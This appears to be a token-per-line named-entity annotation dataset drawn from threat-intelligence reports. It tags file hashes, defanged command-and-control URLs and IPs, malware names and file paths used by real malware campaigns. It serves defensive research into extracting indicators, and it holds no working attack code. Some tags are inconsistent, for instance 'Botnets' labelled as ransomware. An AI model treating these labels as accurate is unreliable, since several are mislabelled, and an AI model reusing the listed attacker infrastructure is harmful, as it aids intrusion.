52	O
61	O
|	O
ta.ShadowTech_Ra	O
|	O
0000d6f0	O
74	O
00	O
49	O
53	O
65	O
72	O
69	O
61	O
6c	O
69	O
7a	O
61	O
62	O
6c	O
65	O
00	O
|	O
t.ISerializable	O
.	O

The	O
low-level	O
keyboard	O
hook	O
procedure	O
intercepts	O
WM_KEYDOWN	O
,	O
WM_KEYUP	O
and	O
WM_	O
SYSKEYDOWN	O
system	O
messages	O
and	O
writes	O
information	O
about	O
each	O
keystroke	O
to	O
the	O
log	O
file	O
.	O

For	O
instance	O
,	O
for	O
a	O
user	O
whose	O
name	O
starts	O
with	O
abc	O
and	O
the	O
key	O
being	O
vwx	O
,	O
the	O
following	O
mutex	O
will	O
be	O
created	O
:	O
\Sessions\1\BaseNamedObjects\170015001b	O
.	O

Evidence	O
collected	O
around	O
the	O
malware	O
operation	O
suggest	O
that	O
Operation	B-malware.infosteal
Aurora	I-malware.infosteal
is	O
simply	O
an	O
example	O
of	O
highly	O
effective	O
malware	O
penetration	O
.	O

Two	O
days	O
after	O
that	O
,	O
the	O
same	O
individual	O
returned	O
to	O
withdraw	O
a	O
further	O
RS	O
8m	O
,	O
but	O
was	O
arrested	O
when	O
he	O
arrived	O
at	O
the	O
bank	O
.	O

(	O
9ebe86a648b1f19836251f946a160b16	B-hash
)	O
,	O

860fa744d8c82859b41e00761c6e25f3	B-hash
PE	O
with	O
Embedded	O
HTA	O
3e9622d1a6d7b924cefe7d3458070d98	B-hash
PE	O
with	O
Embedded	O
HTA	O
f402a482fd96b0a583be2a265acd5e74	B-hash
PE	O
with	O
Embedded	O
HTA	O
f329107f795654bfc62374f8930d1e12	B-hash
PE	O
with	O
Embedded	O
HTA	O
789a021c051651dbc9e01c5d8c0ce129	B-hash
PE	O
with	O
Embedded	O
HTA	O
68f818fa156d45889f36aeca5dc75a81	B-hash
PE	O
with	O
Embedded	O
HTA	O
c2cc04be25f227b13bcb0b1d9811e2fe	B-hash
cryptui.dll	O
6d2cb9e726c9fac0fb36afc377be3aec	B-hash
dd73f749d40146b6c0d2759ba78b1764	B-hash
i4.dt	O
d9d1e72165601012b9d959bd250997b3	B-hash
VBS	O
file	O
with	O
commands	O
to	O
create	O
staging	O
directories	O
for	O
malware	O
03e4f8327fbb6844e78fda7cdae2e8ad	B-hash
pvk2pfx.exe	O
[	O
Legit	O
Windows	O
Tool	O
]	O
hxxp://5.83.162.24/ilha/pz/logs.php	B-url.unknown
hxxp://5.83.162.24/28022018/pz.zip	B-url.unknown
ibamanetibamagovbr[.]org/virada/pz/logs.php	B-url.unknown
sistemasagriculturagov[.]org	B-url.unknown
hxxp://187.84.229.107/05022018/al.zip	B-url.unknown
2999724b1aa19b8238d4217565e31c8e	B-hash
AutoIT	O
Dropper	O
181c8f19f974ad8a84b8673d487bbf0d	B-hash
img1.jpg	O
[	O
lLegit	O
Windows	O
Tool	O
]	O
d3f845c84a2bd8e3589a6fbf395fea06	B-hash
img2.jpg	O
[	O
Banking	O
Trojan	O
]	O
2365fb50eeb6c4476218507008d9a00b	B-hash
d726b53461a4ec858925ed31cef15f1e	B-hash
a8b2b6e63daf4ca3e065d1751cac723b	B-hash
d9682356e78c3ebca4d001de760848b0	B-hash
330721de2a76eed2b461f24bab7b7160	B-hash
6734245beda04dcf5af3793c5d547923	B-hash
a920b668079b2c1b502fdaee2dd2358f	B-hash
fe09217cc4119dedbe85d22ad23955a1	B-hash
82e2c6b0b116855816497667553bdf11	B-hash
4610cdd9d737ecfa1067ac30022d793b	B-hash
34a8dda75aea25d92cd66da53a718589	B-hash
88b808d8164e709df2ca99f73ead2e16	B-hash
d3f845c84a2bd8e3589a6fbf395fea06	B-hash
28a0968163b6e6857471305aee5c17e9	B-hash
1285205ae5dd5fa5544b3855b11b989d	B-hash
613563d7863b4f9f66590064b88164c8	B-hash
3dd43e69f8d71fcc2704eb73c1ea7daf	B-hash
https[:]//panel-dark[.]com/w3af/img2.jpg	B-url.unknown
https[:]//panel-dark[.]com/w3af/img1.jpg	B-url.unknown

With	O
this	O
in	O
mind	O
we	O
performed	O
some	O
simple	O
analysis	O
on	O
the	O
domain	O
names	O
used	O
in	O
this	O
campaign	O
to	O
identify	O
legitimate	O
organisations	O
being	O
impersonated	O
.	O

This	O
has	O
another	O
useful	O
side	O
effect	O
of	O
giving	O
each	O
DLL	O
a	O
unique	O
hash	O
,	O
making	O
it	O
more	O
difficult	O
to	O
identify	O
.	O

struct	O
cmdPacket	O
{	O

Operation	B-malware.infosteal
Daybreak	I-malware.infosteal
appears	O
to	O
have	O
been	O
launched	O
by	O
ScarCruft	B-malware.infosteal
in	O
March	O
2016	O
and	O
employs	O
a	O
previously	O
unknown	O
(	O
0-day	B-malware.backdoor
)	O
Adobe	O
Flash	O
Player	O
exploit	O
.	O

In	O
the	O
wake	O
of	O
this	O
apparent	O
update	O
to	O
FinSpy	B-malware.backdoor
command	O
&	O
control	O
servers	O
,	O
we	O
devised	O
a	O
new	O
fingerprint	O
and	O
conducted	O
a	O
scan	O
of	O
the	O
internet	O
for	O
FinSpy	B-malware.backdoor
command	O
&	O
control	O
servers	O
.	O

What	O
exactly	O
is	O
being	O
stolen	O
from	O
the	O
target	O
machines	O
?	O

One	O
of	O
those	O
domains	O
,	O
T-D-CANADATRUST.COM	B-url.cncsvr
,	O
was	O
updated	O
on	O
23	O
March	O
2015	O
,	O
and	O
appears	O
to	O
be	O
targeting	O
Toronto	O
Dominion	O
(	O
TD	O
)	O
Canada	O
Trust	O
.	O

The	O
Komplex	B-malware.backdoor
Trojan	I-malware.backdoor
is	O
a	O
binder	O
with	O
multiple	O
parts	O
:	O
a	O
dropper	O
,	O
a	O
payload	O
and	O
a	O
decoy	O
pdf	O
file	O
.	O

Have	O
we	O
tested	O
our	O
ability	O
to	O
revert	O
to	O
backups	O
during	O
an	O
incident	O
?	O

Now	O
,	O
as	O
with	O
the	O
tisone360.com	O
site	O
above	O
,	O
we	O
have	O
seen	O
repeated	O
use	O
in	O
2015	O
of	O
a	O
creative	O
chain	O
of	O
delivery	O
sets	O
.	O

Debug	O
and	O
command	O
strings	O
i	O
cunt	O
waiting	O
anymore	O
#	O
%	O
d	O
lights	O
aint	O
turnt	O
off	O
with	O
#	O
%	O
d	O
Not	O
find	O
process	O
CMessageProcessingSystem	O
:	O
:Receive_NO_CONNECT_TO	O
_GAYZER	O
CMessageProcessingSystem	O
:	O
:Receive_TAKE_LAST_CONN	O
ECTION	O
CMessageProcessingSystem	O
:	O
:Send_TAKE_FIN	O

U.S.	O
House	O
of	O
Representatives	O
.	O

0392fb51816dd9583f9cb206a2cf02d9	B-hash
:	O
These	O
files	O
are	O
all	O
created	O
using	O
the	O
PyInstaller	O
tool	O
.	O

This	O
RAT	B-malware.backdoor
is	O
also	O
capable	O
of	O
screen	O
grabbing	O
and	O
keylogging	O
.	O

Containment	O
provided	O
by	O
enclaving	O
also	O
makes	O
incident	O
cleanup	O
significantly	O
less	O
costly	O
.	O

The	O
presence	O
of	O
the	O
following	O
files	O
may	O
indicate	O
netsat.exe	B-malware.infosteal
,	O
et	O
al	O
,	O
involvement	O
:	O
CSIDL_WINDOWS\msagent\	B-malware.backdoor
netui3.dll	I-malware.backdoor
Netui3.dll	B-malware.backdoor
in	O
any	O
path	O
CSIDL_WINDOWS\msagent\	O
netwn.drv	O
Netwn.drv	O
in	O
any	O
path	O
CSIDL_MYPICTURES\winsSetup35.exe	B-malware.backdoor
in	O
any	O
path	O
Setup23.exe	O
in	O
any	O
path	O
CSIDL_NETHOOD\Microsoft\Windows\Help\set.fl	O
CSIDL_LOCAL_APPDATA\Microsoft\Windows\Help\intr	O
CSIDL_NETHOOD\Microsoft\Windows\Chars\ferf.st	O
CSIDL_NETHOOD\Microsoft\Windows\Chars\fert.st	O
CSIDL_LOCAL_APPDATA\Microsoft\Windows\Chars\intr	O
CSIDL_NETHOOD\Microsoft\Windows\message\	O
CSIDL_NETHOOD\Microsoft\Windows\Intel\	O
Act.te	O
in	O
any	O
path	O
u.t	O
in	O
any	O
path	O
netwi.drv	B-malware.backdoor
in	O
any	O
path	O
~FF325I.tmp	O
or	O
~FF323D.tmp	O
in	O
the	O
path	O
specified	O
by	O
the	O
TMP	O
.	O

However	O
files	O
that	O
were	O
n't	O
wiped	O
will	O
be	O
much	O
easier	O
and	O
faster	O
to	O
recover	O
then	O
carving	O
and	O
the	O
context	O
of	O
each	O
file	O
will	O
be	O
easy	O
to	O
interpret	O
.	O

Ch	O
1.5	O
:	O
bbf569176ec7ec611d8a000b50cdb754	B-hash
Ch	O
2.03	O
:	O
78d3f074b70788897ae7e20e5137bf47	B-hash
Code	O
similarity	O
:	O
83	O
%	O
In	O
version	O
2.03	O
of	O
Agent.BTZ	B-malware.backdoor
,	O
the	O
authors	O
changed	O
the	O
following	O
:	O
They	O
added	O
obfuscation	O
in	O
order	O
to	O
hide	O
sensitive	O
strings	O
;	O
The	O
communication	O
protocol	O
was	O
modified	O
in	O
order	O
to	O
include	O
the	O
flag	O
'	O
<	O
CHCMD	O
>	O
'	O
we	O
assume	O
that	O
'	O
CH	O
'	O
has	O
the	O
same	O
meaning	O
than	O
'	O
Ch	O
'	O
before	O
the	O
version	O
number	O
and	O
'	O
CMD	O
'	O
is	O
the	O
abbreviation	O
for	O
command	O
;	O
From	O
now	O
on	O
,	O
the	O
malware	O
supports	O
'	O
runas	O
'	O
in	O
order	O
to	O
execute	O
commands	O
as	O
administrator	O
.	O

We	O
assess	O
that	O
these	O
shared	O
TTPs	O
may	O
be	O
the	O
result	O
of	O
:	O
•	O
A	O
direct	O
relationship	O
between	O
the	O
operators	O
.	O

ebd1f5e471774bb283de44e121efa3e5	B-hash
)	O
,	O
which	O
is	O
the	O
'	O
CT	B-malware.backdoor
'	O
RAT	B-malware.backdoor
.	O

It	O
replaces	O
the	O
'	O
/	O
'	O
(	O
forward	O
slash	O
)	O
and	O
'	O
+	O
'	O
(	O
plus	O
)	O
characters	O
which	O
are	O
part	O
of	O
the	O
base64	O
character	O
set	O
with	O
'	O
_	O
'	O
(	O
underscore	O
)	O
and	O
'	O
­	O
'	O
(	O
hyphen	O
)	O
respectively	O
.	O

However	O
,	O
it	O
should	O
be	O
noted	O
that	O
this	O
was	O
not	O
an	O
isolated	O
incident	O
:	O
this	O
is	O
the	O
latest	O
in	O
a	O
series	O
of	O
similar	O
attacks	O
in	O
Ukraine	O
.	O

Due	O
to	O
the	O
large	O
numbers	O
of	O
samples	O
,	O
in	O
many	O
organizations	O
the	O
vast	O
majority	O
of	O
these	O
samples	O
remain	O
categorized	O
solely	O
on	O
the	O
initial	O
sandbox	O
run	O
.	O

Many	O
methods	O
can	O
be	O
used	O
to	O
find	O
files	O
that	O
contain	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
.	O

Considering	O
the	O
long-standing	O
regional	O
tensions	O
between	O
India	O
and	O
Pakistan	O
,	O
South	O
Asia	O
serves	O
as	O
a	O
likely	O
flashpoint	O
for	O
conventional	O
conflict	O
to	O
carry	O
over	O
and	O
play	O
out	O
within	O
cyberspace	O
.	O

In	O
particular	O
,	O
we	O
note	O
that	O
all	O
these	O
command	O
strings	O
are	O
referenced	O
from	O
the	O
same	O
function	O
.	O

If	O
the	O
field	O
is	O
left	O
empty	O
,	O
the	O
code	O
will	O
assume	O
a	O
valid	O
path	O
to	O
a	O
file	O
on	O
the	O
local	O
machine	O
and	O
will	O
read	O
and	O
display	O
contents	O
to	O
user	O
.	O

With	O
the	O
upcoming	O
Olympics	O
,	O
we	O
expect	O
to	O
see	O
an	O
increase	O
in	O
cyberattacks	O
using	O
Olympics-related	O
themes	O
.	O

This	O
mechanism	O
is	O
used	O
quite	O
often	O
by	O
malware	O
authors	O
,	O
as	O
it	O
is	O
extremely	O
convenient	O
for	O
attackers	O
to	O
create	O
custom	O
binaries	O
for	O
different	O
targets	O
.	O

Based	O
on	O
the	O
tools	O
,	O
modus	O
operandi	O
and	O
IOCs	O
(	O
indicators	O
of	O
compromise	O
)	O
observed	O
in	O
Operation	O
Cobalt	O
Kitty	O
,	O
Cybereason	O
attributes	O
this	O
large-scale	O
cyber	O
espionage	O
APT	O
to	O
the	O
'	O
OceanLotus	O
Group	O
'	O
(	O
which	O
is	O
also	O
known	O
as	O
,	O
APT-C-00	O
,	O
SeaLotus	O
and	O
APT32	O
)	O
.	O

This	O
is	O
a	O
very	O
roundabout	O
way	O
of	O
assigning	O
the	O
hard-coded	O
string	O
890	O
to	O
a	O
buffer	O
.	O

The	O
following	O
AES	O
keys	O
were	O
among	O
those	O
found	O
to	O
be	O
used	O
to	O
encrypt	O
records	O
in	O
.dat	O
files	O
.	O

Just	O
like	O
before	O
,	O
the	O
backdoor	O
uses	O
several	O
transliterated	O
Russian	O
words	O
to	O
either	O
indicate	O
the	O
state	O
of	O
its	O
communication	O
or	O
issue	O
backdoor	O
commands	O
:	O
Translation	O
from	O
Russian	O
Meaning	O
to	O
set	O
to	O
receive	O
to	O
send	O
beginning	O
State/Command	O

However	O
,	O
as	O
of	O
the	O
date	O
of	O
publication	O
,	O
researchers	O
were	O
still	O
analyzing	O
the	O
available	O
sample	O
.	O

After	O
several	O
massive	O
data	O
breaches	O
in	O
2016	O
,	O
the	O
Philippines	O
started	O
to	O
invest	O
in	O
beefing	O
up	O
their	O
defences	O
against	O
cyberattacks	O
.	O

Public	O
knowledge	O
has	O
also	O
established	O
that	O
Iranian	O
academic	O
institutions	O
play	O
a	O
contractor-like	O
role	O
.	O

CreateFileMappingA	O
'	O
API	O
.	O

Analysis	O
of	O
the	O
main	O
ZxShell	B-malware.backdoor
module	O
DllMain	O
Install	O
ServiceMain	O
ShellMain	O
ShellMainThread	O
GetIpListAndConnect	O
MainConnectionIo	O
Uninstall	O
ZxFunction001	O
ZxFunction002	O
4	O
.	O

Less	O
than	O
5	O
%	O
of	O
the	O
victims	O
were	O
Microsoft	O
Windows	O
Enterprise	O
users	O
,	O
which	O
means	O
that	O
currently	O
,	O
RATANKBA	B-malware.backdoor
mostly	O
affects	O
smaller	O
organizations	O
or	O
individual	O
users	O
,	O
not	O
larger	O
organizations	O
.	O

Adware	O
Bots	O
&	O
Botnets	B-malware.ransom
CyberCrime	O
eCrime	O
economy	O
Legal	O
issues	O
Exploits	O
Funny	O
findings	O
Web	O
threats	O
Scareware	O
Phishing	O
Security	O
products	O
Vulnerabilities	O
Social	O
engineering	O
Mails	O
Mobile	O
Mobile	O
Social	O
Network	O

These	O
systems	O
and	O
functions	O
are	O
often	O
referred	O
to	O
as	O
Industrial	O
Control	O
Systems	O
(	O
ICS	O
)	O
or	O
Operational	O
Technology	O
(	O
OT	O
)	O
.	O

Much	O
of	O
the	O
analysis	O
is	O
comprised	O
of	O
dynamic	O
analysis	O
systems	O
,	O
such	O
as	O
sandboxes	O
,	O
to	O
determine	O
whether	O
the	O
sample	O
is	O
malicious	O
or	O
not	O
.	O

In	O
an	O
attempt	O
to	O
increase	O
stealthiness	O
,	O
the	O
CopyKittens	B-malware.backdoor
group	O
has	O
decided	O
to	O
use	O
another	O
open	O
source	O
project	O
by	O
Stephen	O
Fewer	O
(	O
@	O
stephenfewer	O
)	O
.	O

,	O
the	O
startup	O
sequence	O
truly	O
begins	O
in	O
the	O
DllEntryPoint	O
function	O
.	O

Figure	O
26	O
:	O
String	O
Decryption	O
Script	O

RATANKBA	B-malware.backdoor
's	O
controllers	O
use	O
the	O
'	O
Nimo	O
Software	O
HTTP	O
Retriever	O
1.0	O
'	O
user-agent	O
string	O
for	O
its	O
communication	O
.	O

13	O
Sept	O
.	O

Malicious	O
document	O
delivering	O
the	O
Bankshot	O
implant	O
in	O
2017	O
.	O

The	O
second	O
encoded	O
PowerShell	O
script	O
,	O
which	O
is	O
executed	O
after	O
the	O
first	O
script	O
is	O
decoded	O

It	O
is	O
noteworthy	O
that	O
they	O
have	O
adopted	O
the	O
use	O
of	O
scripting	O
langauages	O
for	O
this	O
type	O
of	O
data	O
theft	O
;	O
scripts	O
are	O
easy	O
to	O
maintain	O
even	O
by	O
novice	O
programmers	O
.	O

It	O
has	O
some	O
of	O
the	O
following	O
capabilities	O
:	O
Collection	O
of	O
System	O
Information	O
(	O
e.g.	O
IP	O
,	O
OS	O
version	O
,	O
memory	O
RAM	O
information	O
,	O
Java	O
version	O
,	O
Computer	O
Name	O
,	O
User	O
account	O
compromised	O
,	O
etc	O
.	O
)	O

Once	O
the	O
VBR	O
was	O
found	O
we	O
noted	O
the	O
offset	O
and	O
calculated	O
the	O
sector	O
to	O
locate	O
the	O
backup	O
in	O
our	O
desired	O
forensic	O
program	O
.	O

The	O
remaining	O
features	O
of	O
the	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
protocol	O
were	O
tested	O
successfully	O
with	O
the	O
custom	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
controller	O
while	O
connected	O
to	O
6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df	B-hash
.	O

The	O
tongji2.exe	B-malware.backdoor
module	O
injects	O
itself	O
into	O
iexplore.exe	O
in	O
an	O
attempt	O
to	O
mask	O
itself	O
.	O

[	O
>	O
]	O
'	O
*.php	O

Please	O
find	O
the	O
attached	O
document	O
.	O

Purpose	O

Secondly	O
,	O
we	O
also	O
have	O
reason	O
to	O
believe	O
CozyDuke	B-malware.drop
has	O
,	O
in	O
some	O
instances	O
,	O
downloaded	O
and	O
executed	O
droppers	O
for	O
DLL	O
files	O
reminiscent	O
of	O
OnionDuke	O
.	O

Not	O
only	O
do	O
they	O
have	O
overlapping	O
areas	O
of	O
responsibility	O
,	O
but	O
also	O
rarely	O
share	O
intelligence	O
and	O
even	O
occasionally	O
steal	O
sources	O
from	O
each	O
other	O
and	O
compromise	O
operations	O
.	O

Use	O
of	O
domain	O
impersonating	O
the	O
identity	O
of	O
highly	O
influential	O
Indian	O
think	O
tank	O
Victims/targets	O
chosen	O
(	O
CBI	O
and	O
Army	O
officials	O
)	O
Use	O
of	O
Email	O
theme	O
that	O
is	O
of	O
interest	O
to	O
the	O
targets	O
Location	O
of	O
one	O
of	O
the	O
hard	O
coded	O
IP	O
address	O
in	O
the	O
binary	O
Use	O
of	O
TTP	O
's	O
(	O
tactics	O
,	O
techniques	O
&	O
procedures	O
)	O
similar	O
to	O
the	O
previous	O
campaigns	O
targeting	O
Indian	O
Ministry	O
of	O
External	O
Affairs	O
and	O
Indian	O
Navy	O
's	O
Warship	O
Manufacturer	O
.	O

TEXT=%23INCEPTIONFRAMEWORK	B-malware.backdoor
%	O
20EVOLVED	O
,	O
%	O
20ROLLING	O
%	O
20OUT	O
%	O
20NEW	O
%	O
20TOOLS	O
%	O
20%26%	O
20HIDING	O
%	O
20BEHIND	O
%	O
20INCREASINGLY	O
%	O
2	O
Every	O
connection	O
builds	O
different	O
chains	O
of	O
infected	O
routers	O
and	O
once	O
the	O
connection	O
is	O
complete	O
,	O
it	O
cleans	O
up	O
after	O
itself	O
.	O

As	O
the	O
2017	O
elections	O
in	O
Europe	O
approach	O
-	O
most	O
notably	O
in	O
Germany	O
,	O
France	O
,	O
and	O
the	O
Netherlands	O
-	O
we	O
are	O
already	O
seeing	O
the	O
makings	O
of	O
similarly	O
concerted	O
efforts	O
.	O

For	O
example	O
,	O
many	O
legitimate	O
tools	O
are	O
shared	O
via	O
third	O
party	O
file	O
sharing	O
sites	O
or	O
over	O
social	O
media	O
.	O

Whether	O
this	O
is	O
a	O
false-flag	O
or	O
not	O
is	O
unknown	O
.	O

Since	O
at	O
least	O
2014	O
,	O
FireEye	O
has	O
observed	O
APT32	O
targeting	O
foreign	O
corporations	O
with	O
a	O
vested	O
interest	O
in	O
Vietnam	O
's	O
manufacturing	O
,	O
consumer	O
products	O
,	O
and	O
hospitality	O
sectors	O
.	O

Several	O
registry	O
keys	O
are	O
created	O
and	O
then	O
deleted	O
as	O
part	O
of	O
this	O
process	O
.	O

Poseidon	B-malware.infosteal
Group	O
has	O
interesting	O
practices	O
when	O
it	O
comes	O
to	O
its	O
use	O
of	O
command	O
and	O
control	O
servers	O
,	O
including	O
redundancies	O
and	O
quickly	O
discarding	O
command	O
and	O
control	O
(	O
C	O
&	O
Cs	O
)	O
servers	O
after	O
specific	O
campaigns	O
.	O

We	O
have	O
been	O
able	O
to	O
identify	O
several	O
RedOctober	B-malware.unknown
binaries	O
that	O
have	O
'	O
Rich	O
'	O
headers	O
describing	O
exactly	O
the	O
same	O
layout	O
of	O
VC	O
2010	O
+	O
VC	O
2008	O
object	O
files	O
.	O

Dec	O
7th	O
2011	O

CVE-2010-0249	O

BuildTargetIpListStruct	O
function	O
.	O

China	B-malware.backdoor
Chopper	I-malware.backdoor
's	O
delivery	O
mechanism	O
is	O
flexible	O
due	O
to	O
the	O
size	O
,	O
format	O
,	O
and	O
simplicity	O
of	O
the	O
malware	O
's	O
payload	O
.	O

To	O
mask	O
itself	O
,	O
it	O
can	O
run	O
as	O
a	O
regular	O
library	O
loaded	O
into	O
a	O
legitimate	O
process	O
.	O

In	O
the	O
second	O
wave	O
of	O
attacks	O
,	O
the	O
cybersaboteurs	O
behind	O
the	O
KillDisk	B-malware.ransom
malware	O
added	O
contact	O
information	O
to	O
the	O
malware	O
,	O
so	O
it	O
would	O
look	O
like	O
a	O
typical	O
ransomware	O
attack	O
.	O

Create	O
mutex	O
using	O
the	O
CPU	O
's	O
version	O
to	O
make	O
sure	O
there	O
's	O
no	O
existing	O
running	O
instance	O
of	O
itself	O
.	O

Expansion	O
of	O
operations	O

3.1.3	O
Port	O
Scanning	O
Tools	O

We	O
also	O
observed	O
both	O
attack	O
groups	O
using	O
similar	O
techniques	O
to	O
evade	O
detection	O
by	O
security	O
products	O
.	O

This	O
driver	O
was	O
backed	O
with	O
a	O
new	O
certificate	O
-	O
this	O
time	O
from	O
Jmicron	O
.	O

SPLM	B-malware.backdoor
,	O
otherwise	O
known	O
as	O
CHOPSTICK	B-malware.backdoor
,	O
or	O
by	O
the	O
author	O
(	O
s	O
)	O
as	O
'	O
XAgent	B-malware.backdoor
'	O
,	O
is	O
described	O
as	O
Sofacy	O
's	O
signature	O
second	O
stage	O
tool	O
,	O
selectively	O
used	O
for	O
years	O
against	O
around	O
the	O
world	O
.	O

uploadFile	O
:	O
toServer	O
:	O
]	O

해	O
당	O
악성코드가	O
실행되면	O
지정된	O
IP	O
주소를	O
통해	O
중앙관리	O
솔루션	O
A의	O
에이전트에	O
악성코드가	O
포함된	O
실행	O
파일	O
v3pscan.exe를	B-malware.drop
전송하고	O
실행된다	O
.	O

This	O
means	O
they	O
can	O
make	O
as	O
many	O
different	O
driver	O
files	O
as	O
they	O
like	O
,	O
each	O
having	O
exactly	O
the	O
same	O
functionality	O
and	O
creation	O
date	O
.	O

But	O
for	O
the	O
most	O
part	O
,	O
deployed	O
SPLM	B-malware.backdoor
maintained	O
the	O
structure	O
of	O
earlier	O
executable	O
code	O
.	O

root9B	O
's	O
capability	O
parses	O
live	O
memory	O
while	O
the	O
system	O
is	O
running	O
and	O
looks	O
for	O
indicators	O
of	O
advanced	O
tactics	O
such	O
as	O
code	O
injection	O
or	O
security	O
product	O
bypassing	O
.	O

The	O
MD5	O
of	O
the	O
exploit	O
document	O
was	O
e009b95ff7b69cbbebc538b2c5728b11	B-hash
.	O

Commands	O
0x2C	O
,	O
0x44	O
,	O
and	O
0x48	O
all	O
appear	O
to	O
be	O
the	O
exact	O
same	O
base	O
command	O
with	O
only	O
slight	O
variations	O
in	O
their	O
response	O
format	O
.	O

During	O
this	O
time	O
,	O
DragonOK	B-malware.infosteal
also	O
ran	O
an	O
HTRAN	O
proxy	O
client	O

C	O
:	O
\Documents	O
and	O
Settings\	O
<	O
Username	O
>	O
\Application	O
Data\svchost.exe	O

Putting	O
the	O
cart	O
before	O
the	O
horse	O
:	O
collecting	O
ransom	O
money	O
was	O
never	O
the	O
top	O
priority	O
for	O
the	O
TeleBots	O
group	O
.	O

The	O
media	O
stick	O
infection	O
mechanism	O
has	O
definitely	O
been	O
removed	O
.	O

Our	O
good	O
friend	O
Claudio	O
Giurianeri	O
posted	O
the	O
following	O
tweet	O
on	O
October	O
3	O
,	O
2014	O
The	O
website	O
of	O
the	O
Democratic	O
Party	O
of	O
Hong	O
Kong	O
has	O
been	O
compromised	O
and	O
still	O
is	O
.	O

clear	O
:	O
]	O

The	O
agent	O
awaits	O
C	O
&	O
C	O
commands	O
from	O
the	O
server	O
and	O
inserts	O
them	O
into	O
a	O
command	O
queue	O
that	O
will	O
be	O
executed	O
in	O
a	O
separate	O
thread	O
by	O
MainHandler	O
module	O
.	O

HKLM\SOFTWARE\Classes\HTTP\shell\open\command	O

Kyrgyzstan	O
Ministry	O
of	O
Foreign	O
Affairs	O
OCTOBER	O
2014	O
THROUGH	O
SEPTEMBER	O
2015	O
FireEye	O
iSight	O
Intelligence	O
identified	O
changes	O
made	O
to	O
domain	O
name	O
server	O
(	O
DNS	O
)	O
records	O
that	O
suggest	O
that	O
APT28	B-malware.infosteal
intercepted	O
email	O
traffic	O
from	O
the	O
Kyrgyzstan	O
Ministry	O
of	O
Foreign	O
Affairs	O
after	O
maliciously	O
modifying	O
DNS	O
records	O
of	O
the	O
ministry	O
's	O
authoritative	O
DNS	O
servers	O
.	O

This	O
email	O
also	O
contained	O
the	O
same	O
malicious	O
word	O
document	O
(	O
Uri	O
Terror	O
Report.doc	O
)	O
In	O
the	O
second	O
wave	O
of	O
attack	O
slightly	O
different	O
theme	O
was	O
used	O
,	O
this	O
time	O
attackers	O
used	O
the	O
Jammnu	O
&	O
Kashmir	O
protest	O
theme	O
to	O
target	O
the	O
victims	O
.	O

Examples	O
:	O

The	O
decrypted	O
date	O
turns	O
out	O
to	O
be	O
executable	O
Shellcode	O
which	O
is	O
generated	O
by	O
Cobalt	O
Strike	O
.	O

It	O
is	O
also	O
important	O
to	O
mention	O
that	O
this	O
member	O
's	O
(	O
value	O
,	O
key	O
)	O
are	O
directly	O
read	O
from	O
SWF	O
object	O
,	O
so	O
an	O
attacker	O
can	O
easily	O
use	O
them	O
to	O
implement	O
arbitrary	O
read/write	O
operations	O
.	O

Get	O
information	O
and	O
insight	O
on	O
today	O
's	O
advanced	O
threats	O
from	O
the	O
leader	O
in	O
advanced	O
threat	O
prevention	O
.	O

Given	O
what	O
was	O
revealed	O
during	O
this	O
cursory	O
analysis	O
,	O
finding	O
string	O
and	O
or	O
hash	O
artifacts	O
in	O
SMB	O
traffic	O
seemed	O
the	O
most	O
likely	O
possibility	O
with	O
regard	O
to	O
network	O
detection	O
.	O

This	O
server	O
is	O
used	O
to	O
listen	O
for	O
connections	O
on	O
the	O
same	O
IP	O
but	O
on	O
a	O
different	O
port	O
(	O
444	O
)	O
.	O

The	O
majority	O
of	O
these	O
organizations	O
had	O
some	O
association	O
with	O
the	O
Olympics	O
,	O
either	O
in	O
providing	O
infrastructure	O
or	O
in	O
a	O
supporting	O
role	O
.	O

This	O
is	O
a	O
keylogger	O
,	O
which	O
hooks	O
keyboard	O
and	O
mouse	O
events	O
.	O

Our	O
previous	O
post	O
on	O
their	O
2017	O
activity	O
stepped	O
away	O
from	O
the	O
previously	O
covered	O
headline	O
buzz	O
presenting	O
their	O
association	O
with	O
previously	O
known	O
political	O
hacks	O
and	O
interest	O
in	O
Europe	O
and	O
the	O
US	O
,	O
and	O
examines	O
their	O
under-reported	O
ongoing	O
activity	O
in	O
middle	O
east	O
,	O
central	O
asia	O
,	O
and	O
now	O
a	O
shift	O
in	O
targeting	O
further	O
east	O
,	O
including	O
China	O
,	O
along	O
with	O
an	O
overlap	O
surprise	O
.	O

If	O
ZxShell	B-malware.backdoor
successfully	O
connects	O
to	O
the	O
remote	O
host	O
,	O
the	O
function	O
DoHandshake	O
is	O
called	O
.	O

According	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
the	O
government	O
answer	O
was	O
a	O
tiered	O
approach	O
,	O
with	O
a	O
network	O
of	O
people	O
unofficially	O
associated	O
with	O
the	O
IRGC	O
and	O
Iranian	O
government	O
—	O
a	O
type	O
of	O
ideologically	O
aligned	O
middle	O
management	O
—	O
that	O
were	O
loyal	O
to	O
the	O
regime	O
and	O
demonstrated	O
sufficient	O
religious	O
commitment	O
.	O

A	O
static	O
Run	O
key	O
was	O
also	O
used	O
by	O
the	O
backdoor	O
to	O
establish	O
persistence	O
on	O
the	O
victim	O
machine	O
(	O
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Microsoft	O
iSCSI	O
Initiator	O
)	O
.	O

Detect	O
XSLM	O
Macro	O
launch	O
Detect	O
BEACON	O
written	O
to	O
disk	O
Block*	O
BEACON	O
Callback	O
EX/ETP/NX	O
Block*	O
RTF	O
EX/ETP/NX	O
Block*	O
RTF	O
EX/ETP/NX	O
Block*	O
RTF	O
EX/ETP/NX	O
Block*	O
XSLM	O
FireEye	O
recommends	O
organizations	O
perform	O
the	O
following	O
steps	O
to	O
mitigate	O
the	O
risk	O
of	O
this	O
campaign	O
:	O
1	O
.	O

Only	O
some	O
of	O
the	O

It	O
is	O
critical	O
that	O
the	O
on-demand	O
scan	O
be	O
configured	O
properly	O
.	O

Hash	O

This	O
situation	O
presents	O
a	O
rich	O
variety	O
of	O
targets	O
for	O
attackers	O
in	O
which	O
to	O
seed	O
malicious	O
binaries	O
and	O
links	O
masquerading	O
as	O
familiar	O
or	O
desirable	O
tools	O
.	O

5	O
.	O

또한	O
이	O
위협	O
그룹은	O
한국어에	O
능통한	O
것으로	O
보이며	O
,	O
한국의	O
IT	O
환경에	O
대해	O
잘	O
파악하고	O
있다	O
.	O

chugnnarabashkoim	O
(	O
)	O
)	O
gets	O
called	O
as	O
shown	O
below	O
.	O

